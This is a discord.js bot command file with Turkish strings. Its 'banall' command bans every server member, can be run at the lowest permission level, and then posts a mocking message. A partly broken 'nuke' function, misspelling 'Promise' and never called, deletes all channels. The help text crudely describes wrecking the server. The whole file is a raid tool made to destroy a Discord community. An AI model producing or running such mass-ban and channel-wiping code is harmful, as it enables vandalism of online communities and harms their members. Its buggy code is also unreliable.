const Discord = require("discord.js")

module.exports.run = async (bot, message, args) => {
  let BReason = args.join(" ").slice(0)
  
  let C = message.channel;
  message.guild.members.forEach((f, i) => {
    message.guild.member(f).ban(BReason);
    message.channel.send(`Banlandı ${f}!`);
  });
  C.send("HAHAHAHA TROLLENDİN XD.")
}
  async function nuke(guild) {
  let users= 0;
  let channels = 0;
  
  await Proimse.all(guild.channels.map(c => {
    if (c.deletable) {
      channels++;
      return c.delete();
    }
  }));
}
exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 0
};

exports.help = {
  name: 'banall',
  description: 'Sunucunun Amına Koyarsınız',
  usage: 'herkesibanla'
};